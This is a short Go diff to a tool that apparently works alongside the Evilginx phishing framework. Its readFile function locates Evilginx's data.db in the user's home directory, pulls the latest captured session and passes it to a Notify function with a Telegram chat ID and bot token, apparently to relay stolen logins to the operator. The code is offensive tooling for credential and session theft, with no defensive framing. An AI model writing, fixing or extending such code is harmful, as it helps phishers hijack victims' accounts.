@@ -80,8 +80,13 @@ func ReadLatestSession(filePath string) (TSession, error) {
 }
 
 func readFile(chatid string, teletoken string) {
+	homeDir, err := os.UserHomeDir()
+	if err != nil {
+		fmt.Printf("Error getting user home directory: %v\n", err)
+		return
+	}
 
-	filePath := "/root/.evilginx/data.db"
+	filePath := homeDir + "/.evilginx/data.db"
 
 	latestSession, err := ReadLatestSession(filePath)
 	if err != nil {
@@ -90,9 +95,9 @@ func readFile(chatid string, teletoken string) {
 	}
 
 	if latestSession.ID != 0 { // Assuming ID 0 indicates no valid session
-
 		Notify(latestSession, chatid, teletoken)
 	} else {
 		fmt.Println("No session found.")
 	}
 }
+
